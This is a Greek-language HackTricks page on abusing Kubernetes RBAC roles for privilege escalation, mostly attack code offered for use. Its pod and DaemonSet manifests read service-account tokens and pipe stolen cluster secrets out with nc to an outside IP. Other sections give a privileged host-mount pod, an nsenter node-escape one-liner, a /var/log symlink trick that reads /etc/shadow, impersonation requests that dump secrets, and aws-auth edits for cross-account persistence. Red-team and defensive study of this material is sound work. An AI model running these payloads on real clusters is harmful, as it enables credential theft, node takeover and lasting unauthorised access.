# Κατάχρηση Ρόλων/ClusterRoles στο Kubernetes

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του GitHub.

</details>

Εδώ μπορείτε να βρείτε μερικές ενδεχομένως επικίνδυνες διαμορφώσεις Ρόλων και ClusterRoles.\
Θυμηθείτε ότι μπορείτε να λάβετε όλους τους υποστηριζόμενους πόρους με την εντολή `kubectl api-resources`

## **Ανόδος Προνομίων**

Αναφερόμενοι ως η τέχνη της **πρόσβασης σε διαφορετικό υποκείμενο** εντός του cluster **με διαφορετικά προνόμια** (εντός του cluster Kubernetes ή προς εξωτερικά cloud) από αυτά που ήδη έχετε, στο Kubernetes υπάρχουν βασικά **4 κύριες τεχνικές για την ανάδειξη προνομίων**:

* Να είστε σε θέση να **υποκαταστήσετε** άλλον χρήστη/ομάδες/SAs με καλύτερα προνόμια εντός του cluster Kubernetes ή προς εξωτερικά cloud
* Να είστε σε θέση να **δημιουργήσετε/τροποποιήσετε/εκτελέσετε pods** όπου μπορείτε να **βρείτε ή συνδεθείτε με SAs** με καλύτερα προνόμια εντός του cluster Kubernetes ή προς εξωτερικά cloud
* Να είστε σε θέση να **διαβάσετε μυστικά** καθώς τα τεκμήρια των SAs αποθηκεύονται ως μυστικά
* Να είστε σε θέση να **δραπετεύσετε στον κόμβο** από ένα container, όπου μπορείτε να κλέψετε όλα τα μυστικά των containers που τρέχουν στον κόμβο, τα διαπιστευτήρια του κόμβου και τα δικαιώματα του κόμβου εντός του cloud στο οποίο τρέχει (εάν υπάρχουν)
* Μια πέμπτη τεχνική που αξίζει μνεία είναι η δυνατότητα να **εκτελέσετε port-forward** σε ένα pod, καθώς μπορείτε να έχετε πρόσβαση σε ενδιαφέρουσες πηγές μέσα σε εκείνο το pod.

### Πρόσβαση σε Οποιονδήποτε Πόρο ή Ρήμα (Μπαλαντέρ)

Το **μπαλαντέρ (\*) δίνει άδεια πάνω σε οποιονδήποτε πόρο με οποιοδήποτε ρήμα**. Χρησιμοποιείται από διαχειριστές. Μέσα σε ένα ClusterRole αυτό σημαίνει ότι ένας επιτιθέμενος θα μπορούσε να καταχραστεί οποιοδήποτε namespace στο cluster
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### Πρόσβαση σε οποιοδήποτε Πόρο με ένα συγκεκριμένο ρήμα

Στο RBAC, ορισμένες άδειες συνιστούν σημαντικούς κινδύνους:

1. **`create`:** Χορηγεί τη δυνατότητα δημιουργίας οποιουδήποτε πόρου στο cluster, κινδυνεύοντας από άποψη προνομιούχου ανόδου.
2. **`list`:** Επιτρέπει τη λίσταρισμα όλων των πόρων, πιθανώς διαρρέοντας ευαίσθητα δεδομένα.
3. **`get`:** Επιτρέπει την πρόσβαση σε μυστικά από λογαριασμούς υπηρεσιών, δημιουργώντας απειλή για την ασφάλεια.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Δημιουργία Κελιού - Κλοπή Διακριτικού

Ένας επιτιθέμενος με τις άδειες για τη δημιουργία ενός κελιού, θα μπορούσε να επισυνάψει ένα προνομιούχο Λογαριασμό Υπηρεσίας στο κελί και να κλέψει το διακριτικό για να υποκριθεί τον Λογαριασμό Υπηρεσίας. Αποτελεσματικά ανεβάζοντας τα προνόμια σε αυτόν

Παράδειγμα ενός κελιού που θα κλέψει το διακριτικό του Λογαριασμού Υπηρεσίας `bootstrap-signer` και θα το στείλει στον επιτιθέμενο:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### Δημιουργία & Απόδραση Κελύφους

Το παρακάτω υποδεικνύει όλα τα προνόμια που μπορεί να έχει ένας container:

* **Προνόμια πρόσβασης** (απενεργοποίηση προστασιών και ρύθμιση δυνατοτήτων)
* **Απενεργοποίηση των namespaces hostIPC και hostPid** που μπορεί να βοηθήσει στην εξέλιξη των προνομίων
* **Απενεργοποίηση του namespace hostNetwork**, που δίνει πρόσβαση για κλοπή προνομίων cloud των κόμβων και καλύτερη πρόσβαση στα δίκτυα
* **Προσάρτηση του hosts / μέσα στο container**
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

Δημιουργήστε το pod με:
```bash
kubectl --token $token create -f mount_root.yaml
```
Ένα-γραμμή από [αυτό το tweet](https://twitter.com/mauilion/status/1129468485480751104) και με μερικές προσθήκες:
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
Τώρα που μπορείτε να δραπετεύσετε στον κόμβο ελέγξτε τεχνικές μετά-εκμετάλλευσης στο:

#### Αόρατος

Πιθανόν να θέλετε να είστε **πιο αόρατος**, στις παρακάτω σελίδες μπορείτε να δείτε σε τι θα μπορούσατε να έχετε πρόσβαση αν δημιουργήσετε ένα pod ενεργοποιώντας μόνο κάποια από τα αναφερόμενα προνόμια στο προηγούμενο πρότυπο:

* **Με προνόμια + hostPID**
* **Με προνόμια μόνο**
* **hostPath**
* **hostPID**
* **hostNetwork**
* **hostIPC**

_Μπορείτε να βρείτε παράδειγμα πώς να δημιουργήσετε/καταχρηστείτε τις προηγούμενες διαμορφώσεις προνομίων των pods στο_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods)

### Δημιουργία Pod - Μετάβαση στο cloud

Αν μπορείτε να **δημιουργήσετε** ένα **pod** (και προαιρετικά ένα **λογαριασμό υπηρεσίας**) μπορείτε να **αποκτήσετε προνόμια στο περιβάλλον cloud** με το **ανάθεση ρόλων cloud σε ένα pod ή ένα λογαριασμό υπηρεσίας** και στη συνέχεια να έχετε πρόσβαση σε αυτό.\
Επιπλέον, αν μπορείτε να δημιουργήσετε ένα **pod με το namespace δικτύου του κόμβου** μπορείτε να **κλέψετε τον ρόλο IAM** της **κόμβου**.

Για περισσότερες πληροφορίες ελέγξτε:

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **Δημιουργία/Επιδιόρθωση Αναπτύξεων, Daemonsets, Statefulsets, Replicationcontrollers, Replicasets, Jobs και Cronjobs**

Είναι δυνατόν να καταχρηστείτε αυτές τις άδειες για να **δημιουργήσετε ένα νέο pod** και να κλέψετε προνόμια όπως στο προηγούμενο παράδειγμα.

Το παρακάτω yaml **δημιουργεί ένα daemonset και εξαγάγει το τεκμήριο του SA** μέσα στο pod:
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **Pods Exec**

**`pods/exec`** είναι ένας πόρος στο Kubernetes που χρησιμοποιείται για **εκτέλεση εντολών σε ένα κέλυφος μέσα σε ένα pod**. Αυτό επιτρέπει να **εκτελέσετε εντολές μέσα στα containers ή να αποκτήσετε ένα κέλυφος μέσα**.

Επομένως, είναι δυνατόν να **μπείτε μέσα σε ένα pod και να κλέψετε το token του SA**, ή να μπείτε σε ένα προνομιούχο pod, να δραπετεύσετε στον κόμβο, και να κλέψετε όλα τα tokens των pods στον κόμβο και (κατ)χρησιμοποιήσετε τον κόμβο:
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
### port-forward

Αυτή η άδεια επιτρέπει τη **προώθηση ενός τοπικού θύρας σε μια θύρα στο συγκεκριμένο pod**. Αυτό έχει σκοπό να επιτρέψει την εύκολη αποσφαλμάτωση εφαρμογών που εκτελούνται μέσα σε ένα pod, αλλά ένας επιτιθέμενος μπορεί να το καταχραστεί για να αποκτήσει πρόσβαση σε ενδιαφέρουσες (όπως ΒΔ) ή ευάλωτες εφαρμογές (ιστούς;) μέσα σε ένα pod:
```
kubectl port-forward pod/mypod 5000:5000
```
### Εκτέλεση Απόδρασης στο /var/log/ των Κεντρικών Υπολογιστών

Όπως [**υποδεικνύεται σε αυτή την έρευνα**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), αν μπορείτε να έχετε πρόσβαση ή να δημιουργήσετε ένα pod με το **σημείο πρόσβασης των κεντρικών υπολογιστών `/var/log/` προσαρτημένο** σε αυτό, μπορείτε να **αποδράσετε από το container**.\
Αυτό συμβαίνει βασικά επειδή όταν το **Kube-API προσπαθεί να λάβει τα αρχεία καταγραφής** ενός container (χρησιμοποιώντας το `kubectl logs <pod>`), ζητά το αρχείο `0.log` του pod χρησιμοποιώντας το τέλειο `/logs/` της υπηρεσίας **Kubelet**.\
Η υπηρεσία Kubelet εκθέτει το τέλειο `/logs/` το οποίο ουσιαστικά **εκθέτει το σύστημα αρχείων `/var/log` του container**.

Συνεπώς, ένας επιτιθέμενος με **πρόσβαση εγγραφής στον φάκελο /var/log/** του container θα μπορούσε να εκμεταλλευτεί αυτή τη συμπεριφορά με δύο τρόπους:

* Τροποποιώντας το αρχείο `0.log` του container του (συνήθως βρίσκεται στο `/var/logs/pods/namespace_pod_uid/container/0.log`) ώστε να είναι ένα **σύμβολο σύνδεσης προς το `/etc/shadow`** για παράδειγμα. Έπειτα, θα μπορείτε να εξαγάγετε το αρχείο σκιάς των κεντρικών υπολογιστών κάνοντας:
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* Εάν ο επιτιθέμενος ελέγχει οποιονδήποτε κύριο με τα **δικαιώματα για ανάγνωση του `nodes/log`**, μπορεί απλά να δημιουργήσει ένα **σύμβολο σύνδεσης** στο `/host-mounted/var/log/sym` προς το `/` και όταν **έχει πρόσβαση στο `https://<gateway>:10250/logs/sym/` θα εμφανίσει το ριζικό σύστημα των κόμβων** (η αλλαγή του συμβόλου σύνδεσης μπορεί να παρέχει πρόσβαση σε αρχεία).
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**Ένα εργαστήριο και ένα αυτοματοποιημένο exploit μπορεί να βρεθεί στο** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### Παράκαμψη προστασίας readOnly <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Αν είστε αρκετά τυχεροί και η υψηλά προνομιούχη ικανότητα `CAP_SYS_ADMIN` είναι διαθέσιμη, μπορείτε απλά να ξανατοποθετήσετε τον φάκελο ως rw:
```bash
mount -o rw,remount /hostlogs/
```
#### Παράκαμψη προστασίας hostPath readOnly <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Όπως αναφέρεται στην [**συγκεκριμένη έρευνα**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html) είναι δυνατόν να παρακαμφθεί η προστασία:
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
Το παραπάνω είχε σκοπό να αποτρέψει διαρροές όπως οι προηγούμενες, αντί να χρησιμοποιεί ένα hostPath mount, χρησιμοποιεί ένα PersistentVolume και ένα PersistentVolumeClaim για την προσάρτηση ενός φακέλου των hosts στον container με εγγράψιμη πρόσβαση:
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **Παρασιωπώντας προνομιούχους λογαριασμούς**

Με ένα [**προνομιούχο παρασιώπησης χρήστη**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation), ένας εισβολέας θα μπορούσε να παρασιωπήσει ένα προνομιούχο λογαριασμό.

Απλά χρησιμοποιήστε την παράμετρο `--as=<όνομα_χρήστη>` στην εντολή `kubectl` για να παρασιωπήσετε έναν χρήστη, ή `--as-group=<ομάδα>` για να παρασιωπήσετε μια ομάδα:
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
Ή χρησιμοποιήστε το REST API:
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Καταγραφή Μυστικών

Η άδεια για **καταγραφή μυστικών μπορεί να επιτρέψει σε έναν εισβολέα να διαβάσει πραγματικά τα μυστικά** με την πρόσβαση στο σημείο τερματικού REST API:
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Διάβασμα ενός μυστικού - δύναμη εξαναγκασμού ταυτότητας διακριτικού

Ενώ ένας επιτιθέμενος που διαθέτει ένα ταυτότητα με δικαιώματα ανάγνωσης απαιτεί το ακριβές όνομα του μυστικού για να το χρησιμοποιήσει, αντίθετα με το ευρύτερο προνόμιο _**λίστας μυστικών**_, υπάρχουν ακόμα ευπάθειες. Τα προεπιλεγμένα λογαριασμοί υπηρεσίας στο σύστημα μπορούν να απαριθμηθούν, καθένας συσχετισμένος με ένα μυστικό. Αυτά τα μυστικά έχουν μια δομή ονόματος: ένα στατικό πρόθεμα ακολουθούμενο από ένα τυχαίο πενταψήφιο αλφαριθμητικό διακριτικό (εξαιρουμένων ορισμένων χαρακτήρων) σύμφωνα με το [κώδικα πηγής](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83).

Το διακριτικό δημιουργείται από ένα περιορισμένο σύνολο 27 χαρακτήρων (`bcdfghjklmnpqrstvwxz2456789`), αντί για την πλήρη αλφαριθμητική σειρά. Αυτός ο περιορισμός μειώνει το συνολικό δυνατό αριθμό συνδυασμών σε 14.348.907 (27^5). Συνεπώς, ένας επιτιθέμενος θα μπορούσε εφικτά να εκτελέσει μια επίθεση εξαναγκασμού για να συμπεράνει το διακριτικό μέσα σε λίγες ώρες, πιθανώς οδηγώντας σε ανόδο προνομίων με την πρόσβαση σε ευαίσθητους λογαριασμούς υπηρεσίας.

### Αιτήσεις Υπογραφής Πιστοποιητικών

Εάν έχετε τα ρήματα **`create`** στο αντικείμενο `certificatesigningrequests` (ή τουλάχιστον στο `certificatesigningrequests/nodeClient`). Μπορείτε **να δημιουργήσετε** ένα νέο CeSR ενός **νέου κόμβου**.

Σύμφωνα με την [τεκμηρίωση είναι δυνατόν να εγκριθούν αυτές οι αιτήσεις αυτόματα](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), έτσι σε αυτήν την περίπτωση **δεν χρειάζεστε επιπλέον δικαιώματα**. Αν όχι, θα χρειαζόσασταν τη δυνατότητα να εγκρίνετε το αίτημα, πράγμα που σημαίνει ενημέρωση στο `certificatesigningrequests/approval` και `approve` στους `signers` με το όνομα πόρου `<signerNameDomain>/<signerNamePath>` ή `<signerNameDomain>/*`

Ένα **παράδειγμα ενός ρόλου** με όλα τα απαιτούμενα δικαιώματα είναι:
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
Έτσι, με το νέο CSR του κόμβου εγκριθέν, μπορείτε να **καταχραστείτε** τα ειδικά δικαιώματα των κόμβων για να **κλέψετε μυστικά** και να **εξελίξετε προνόμια**.

Σε [**αυτήν την ανάρτηση**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) και [**αυτήν**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/) η διαμόρφωση GKE K8s TLS Bootstrap έχει ρυθμιστεί με **αυτόματη υπογραφή** και καταχράζεται για να δημιουργήσει διαπιστευτήρια ενός νέου κόμβου K8s και στη συνέχεια να καταχραστεί αυτά για την εξέλιξη προνομίων με τον τρόπο της κλοπής μυστικών.\
Αν **έχετε τα αναφερόμενα προνόμια μπορείτε να κάνετε το ίδιο πράγμα**. Σημειώστε ότι το πρώτο παράδειγμα παρακάμπτει το σφάλμα που εμποδίζει ένα νέο κόμβο να έχει πρόσβαση σε μυστικά μέσα σε εκτελέσιμα επειδή ένας **κόμβος μπορεί να έχει πρόσβαση μόνο στα μυστικά των εκτελέσιμων που έχουν προσαρτηθεί σε αυτόν.**

Ο τρόπος για να παρακάμψετε αυτό είναι απλά να **δημιουργήσετε διαπιστευτήρια κόμβου για το όνομα του κόμβου όπου έχει προσαρτηθεί το εκτελέσιμο με τα ενδιαφέροντα μυστικά** (αλλά ελέγξτε πώς να το κάνετε στην πρώτη ανάρτηση):
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth configmaps

Οι αρχές που μπορούν να τροποποιήσουν τα **`configmaps`** στο namespace kube-system στο EKS (χρειάζεται να είναι σε συστήματα AWS) μπορούν να αποκτήσουν προνόμια διαχειριστή συστήματος επανεγγράφοντας το **aws-auth** configmap.\
Οι ρήματα που απαιτούνται είναι **`update`** και **`patch`**, ή **`create`** αν το configmap δεν ήταν ήδη δημιουργημένο:
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
Μπορείτε να χρησιμοποιήσετε το **`aws-auth`** για **επιμονή** δίνοντας πρόσβαση σε χρήστες από **άλλους λογαριασμούς**.

Ωστόσο, το `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **δεν λειτουργεί από διαφορετικό λογαριασμό**. Αλλά στην πραγματικότητα, το `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` λειτουργεί αν βάλετε το ARN του cluster αντί για μόνο το όνομα.\
Για να λειτουργήσει το `kubectl`, απλά βεβαιωθείτε ότι **διαμορφώνετε** το **kubeconfig των θυμάτων** και στα ορίσματα εκτέλεσης του aws προσθέστε `--profile other_account_role` ώστε το kubectl να χρησιμοποιεί το προφίλ του άλλου λογαριασμού για να λάβει το token και να επικοινωνήσει με το AWS.
{% endhint %}

### Εξελισσόμενο στο GKE

Υπάρχουν **2 τρόποι να αναθέσετε δικαιώματα K8s σε βασικούς GCP**. Σε κάθε περίπτωση, ο βασικός χρειάζεται επίσης το δικαίωμα **`container.clusters.get`** για να μπορεί να συγκεντρώσει διαπιστευτήρια για πρόσβαση στο cluster, ή θα πρέπει να **δημιουργήσετε το δικό σας αρχείο διαμόρφωσης kubectl** (ακολουθήστε τον επόμενο σύνδεσμο).

{% hint style="warning" %}
Όταν μιλάμε με το σημείο API του K8s, το **GCP διακριτικό ελέγχου θα αποσταλεί**. Στη συνέχεια, το GCP, μέσω του σημείου API του K8s, θα ελέγξει πρώτα αν ο βασικός (με email) έχει κάποια πρόσβαση μέσα στο cluster, και στη συνέχεια θα ελέγξει αν έχει κάποια πρόσβαση μέσω του GCP IAM.\
Αν **οποιοδήποτε** από αυτά είναι **αληθές**, θα απαντηθεί. Αν **όχι**, θα δοθεί ένα σφάλμα που υποδηλώνει να δώσετε δικαιώματα μέσω του GCP IAM.
{% endhint %}

Στη συνέχεια, ο πρώτος τρόπος είναι με τη χρήση του **GCP IAM**, τα δικαιώματα K8s έχουν τα **αντίστοιχα δικαιώματα GCP IAM**, και αν ο βασικός τα έχει, θα μπορεί να τα χρησιμοποιήσει.

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

Ο δεύτερος τρόπος είναι **η ανάθεση δικαιωμάτων K8s μέσα στο cluster** στον εντοπισμό του χρήστη με το **email** του (συμπεριλαμβανομένων των λογαριασμών υπηρεσιών GCP).

### Δημιουργία διακριτικών υπηρεσιών

Οι βασικοί που μπορούν να **δημιουργήσουν αιτήσεις διακριτικών** (`serviceaccounts/token`) Όταν μιλάμε με το σημείο API του K8s, οι SAs (πληροφορίες από [**εδώ**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego)).

### ephemeralcontainers

Οι βασικοί που μπορούν να **`ενημερώσουν`** ή **`επιδιορθώσουν`** **`pods/ephemeralcontainers`** μπορεί να αποκτήσουν **εκτέλεση κώδικα σε άλλα pods**, και ενδεχομένως **να διαφύγουν** στον κόμβο τους προσθέτοντας ένα προσωρινό container με ένα προνομιούχο securityContext

### ValidatingWebhookConfigurations ή MutatingWebhookConfigurations

Οι βασικοί με οποιαδήποτε από τις ενέργειες `create`, `update` ή `patch` πάνω από `validatingwebhookconfigurations` ή `mutatingwebhookconfigurations` ενδέχεται να μπορούν να **δημιουργήσουν ένα από αυτά τα webhookconfigurations** για να μπορούν **να αναβαθμίσουν δικαιώματα**.

Για ένα παράδειγμα [`mutatingwebhookconfigurations` ελέγξτε αυτήν την ενότητα του post](./#malicious-admission-controller).

### Αναβάθμιση

Όπως μπορείτε να διαβάσετε στην επόμενη ενότητα: [**Ενσωματωμένη Πρόληψη Προνομιούχου Ανόδου**](./#built-in-privileged-escalation-prevention), ένας βασικός δεν μπορεί να ενημερώσει ούτε να δημιουργήσει ρόλους ή clusterroles χωρίς να έχει ο ίδιος αυτά τα νέα δικαιώματα. Εκτός αν έχει τη **ενέργεια `escalate`** πάνω από **`roles`** ή **`clusterroles`.**\
Τότε μπορεί να ενημερώσει/δημιουργήσει νέους ρόλους, clusterroles με καλύτερα δικαιώματα από αυτά που έχει.

### Κόμβοι proxy

Οι βασικοί με πρόσβαση στο **`nodes/proxy`** υπο-πόριθμο μπορούν **να εκτελέσουν κώδικα σε pods** μέσω του API του Kubelet (σύμφωνα με [**αυτό**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego)). Περισσότερες πληροφορίες σχετικά με την ταυτοποίηση του Kubelet σε αυτήν τη σελίδα:

{% content-ref url="../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

Έχετε ένα παράδειγμα πώς να πάρετε [**RCE μιλώντας εξουσιοδοτημένα σε ένα Kubelet API εδώ**](../pentesting-kubernetes-services/#kubelet-rce).

### Διαγραφή pods + μη-προγραμματισμένοι κόμβοι

Οι βασικοί που μπορούν να **διαγράψουν pods** (`delete` ενέργεια πάνω από το `pods` resource), ή **εκκινήσουν pods** (`create` ενέργεια πάνω από το `pods/eviction` resource), ή **αλλάξουν την κατάσταση του pod** (πρόσβαση στο `pods/status`) και μπορούν **να κάνουν άλλους κόμβους μη-προγραμματίσιμους** (πρόσβαση στο `nodes/status`) ή **να διαγράψουν κόμβους** (`delete` ενέργεια πάνω από το `nodes` resource) και έχουν έλεγχο πάνω σε ένα pod, θα μπορούσαν **να κλέψουν pods από άλλους κόμβους** ώστε να **εκτελεστούν** στο **υποβαθμισμένο** **κόμβο** και ο επιτιθέμενος μπορεί **να κλέψει τα διακριτικά** από αυτά τα pods.
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### Κατάσταση υπηρεσιών (CVE-2020-8554)

Οι αρχές που μπορούν να **τροποποιήσουν** το **`services/status`** μπορεί να ορίσουν το πεδίο `status.loadBalancer.ingress.ip` για να εκμεταλλευτούν το **ανεπισκευάστο CVE-2020-8554** και να εκκινήσουν επιθέσεις **MiTM ενάντια στο cluster**. Οι περισσότερες μετρήσεις για το CVE-2020-8554 αποτρέπουν μόνο τις υπηρεσίες ExternalIP (σύμφωνα με [**αυτό**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego)).

### Κατάσταση κόμβων και Pods

Οι αρχές με δικαιώματα **`update`** ή **`patch`** πάνω στο `nodes/status` ή `pods/status`, μπορούν να τροποποιήσουν ετικέτες για να επηρεάσουν τους περιορισμούς προγραμματισμού που επιβάλλονται.

